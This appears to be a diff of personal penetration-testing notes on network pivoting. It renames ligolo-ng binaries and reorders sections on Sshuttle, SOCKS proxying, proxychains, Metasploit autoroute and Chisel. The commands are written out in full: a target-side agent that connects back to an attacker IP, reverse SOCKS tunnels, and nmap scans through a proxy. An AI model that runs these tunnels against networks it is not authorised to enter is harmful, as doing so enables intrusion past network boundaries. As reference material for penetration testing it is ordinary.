@@ -139,8 +139,7 @@ Sets up a new interface and traffic moves through new interface and its respecti
 sudo ip tuntap add user $(whoami) mode tun ligolo
 sudo ip link set ligolo up
 sudo ip addr add <MY_IP_ON_SUBNET>/24 dev ligolo  # .252
-sudo ./proxy -selfcert -laddr 0.0.0.0:11601
-# sudo ip route add <SUBNET>/24 dev <INTERFACE>
+sudo ./ligolo-proxy -selfcert -laddr 0.0.0.0:11601
 
 # If tunnel connects, sometimes route needs manual config
 sudo ip route add <SUBNET>/24 dev ligolo
@@ -152,7 +151,7 @@ sudo ip route add <SUBNET>/24 dev ligolo
 
 ```bash
 # TARGET
-.\agent.exe -bind 0.0.0.0:<PORT>
+.\ligolo-agent.exe -bind 0.0.0.0:<PORT>
 
 # ATTACKER: ligolo session
 connect_agent --ip <TARGET>:<PORT>
@@ -164,7 +163,7 @@ tunnel_start --tun ligolo
 
 ```bash
 # Target
-.\agent.exe -connect <ATTACKER_IP>:11601 -ignore-cert -retry
+.\ligolo-agent.exe -connect <ATTACKER_IP>:11601 -ignore-cert -retry
 
 # ATTACKER: ligolo session
 session
@@ -179,6 +178,44 @@ Callbacks do **not** work automatically but can be enabled via a tunnel. These o
 
 ```bash
 listener_add --addr 0.0.0.0:<PIVOT_PORT> --to 127.0.0.1:<ATTACKER_PORT> --tcp
+```
+
+## Sshuttle
+
+- https://github.com/sshuttle/sshuttle
+
+"Transparent proxy server that works as a poor man's VPN. Forwards over ssh. Doesn't require admin... Supports DNS tunneling `--dns`." **Works for TCP but NOT ICMP**
+
+```bash
+sudo apt install -y sshuttle
+# NOTE: -x excludes the pivot IP to avoid routing issues
+sudo sshuttle -r <USER>@<TARGET> --ssh-cmd "ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null" -x <PIVOT_IP> -v <TARGET_SUBNET>
+```
+
+## SOCKS
+
+- Remember that only proper TCP traffic works with SOCKS (e.g. **NOT** certain scans like `nmap -sS` sends malformed packets or ICMP ping), use `nmap -sT --proxy`
+- `sudo proxychains` is required for some (or most/all) proxied tools like `netexec`
+
+| **Feature**             | **SOCKS4**                        | **SOCKS5**                            |
+| ----------------------- | --------------------------------- | ------------------------------------- |
+| **Transport Protocols** | TCP only                          | **TCP & UDP**                         |
+| **Addressing**          | IPv4 Only                         | **IPv4 & IPv6**                       |
+| **DNS Resolution**      | Client-side (vulnerable to leaks) | **Remote/Proxy-side** (via SOCKS5/4a) |
+| **Authentication**      | None (Ident-based only)           | **Username/Password**, GSS-API        |
+| **Nmap Compatibility**  | Native `--proxy` (very stable)    | Better via `proxychains`              |
+| **SSH (`-D`) Default**  | Supported (manual flag)           | **Default**                           |
+| **Chisel Default**      | Not standard                      | **Native / Built-in**                 |
+
+```bash
+sudo proxychains -q -f <CONFIG_FILE> <COMMAND>
+
+sudo proxychains msfconsole
+
+# USE nmap's builtin --proxy option
+nmap -sT -Pn -n --proxy socks4://127.0.0.1:9050 <TARGET>
+# --unprivileged avoids raw sockets and "bad" packets
+nmap -n -Pn -sT -sV --unprivileged --proxy socks4://127.0.0.1:9050 -p21,22,23,53,80,135,139,389,443,445,1433,3389,5985,5986,8080 --stats-every 15s --open -v -oA nmap_subnet_discovery <TARGET_SUBNET>
 ```
 
 ### Pre-Requisites
@@ -214,6 +251,7 @@ sudo ln -sf /etc/proxychains_ssh.conf /etc/proxychains.conf
 ```bash
 sudo proxychains -q -f <CONFIG_FILE> bash
 ```
+
 #### Metasploit
 
 ```bash
@@ -268,18 +306,6 @@ run post/multi/manage/autoroute SUBNET=<SUBNET> SESSION=<SESSION>
 route
 ```
 
-## Sshuttle
-
-- https://github.com/sshuttle/sshuttle
-
-"Transparent proxy server that works as a poor man's VPN. Forwards over ssh. Doesn't require admin... Supports DNS tunneling `--dns`." **Works for TCP but NOT ICMP**
-
-```bash
-sudo apt install -y sshuttle
-# NOTE: -x excludes the pivot IP to avoid routing issues
-sudo sshuttle -r <USER>@<TARGET> --ssh-cmd "ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null" -x <PIVOT_IP> -v <TARGET_SUBNET>
-```
-
 ## Chisel
 
 - https://github.com/jpillora/chisel
@@ -326,30 +352,3 @@ upx --lzma chisel*
 # REDIR
 ./chisel client -v <CHISEL_SERVER>:<LISTEN_PORT> R:1080:socks
 ```
-
-## SOCKS
-
-- Remember that only proper TCP traffic works with SOCKS (e.g. **NOT** certain scans like `nmap -sS` sends malformed packets or ICMP ping), use `nmap -sT --proxy`
-- `sudo proxychains` is required for some (or most/all) proxied tools like `netexec`
-
-| **Feature**             | **SOCKS4**                        | **SOCKS5**                            |
-| ----------------------- | --------------------------------- | ------------------------------------- |
-| **Transport Protocols** | TCP only                          | **TCP & UDP**                         |
-| **Addressing**          | IPv4 Only                         | **IPv4 & IPv6**                       |
-| **DNS Resolution**      | Client-side (vulnerable to leaks) | **Remote/Proxy-side** (via SOCKS5/4a) |
-| **Authentication**      | None (Ident-based only)           | **Username/Password**, GSS-API        |
-| **Nmap Compatibility**  | Native `--proxy` (very stable)    | Better via `proxychains`              |
-| **SSH (`-D`) Default**  | Supported (manual flag)           | **Default**                           |
-| **Chisel Default**      | Not standard                      | **Native / Built-in**                 |
-
-```bash
-sudo proxychains -q -f <CONFIG_FILE> <COMMAND>
-
-sudo proxychains msfconsole
-
-# USE nmap's builtin --proxy option
-nmap -sT -Pn -n --proxy socks4://127.0.0.1:9050 <TARGET>
-# --unprivileged avoids raw sockets and "bad" packets
-nmap -n -Pn -sT -sV --unprivileged --proxy socks4://127.0.0.1:9050 -p21,22,23,53,80,135,139,389,443,445,1433,3389,5985,5986,8080 --stats-every 15s --open -v -oA nmap_subnet_discovery <TARGET_SUBNET>
-```
-
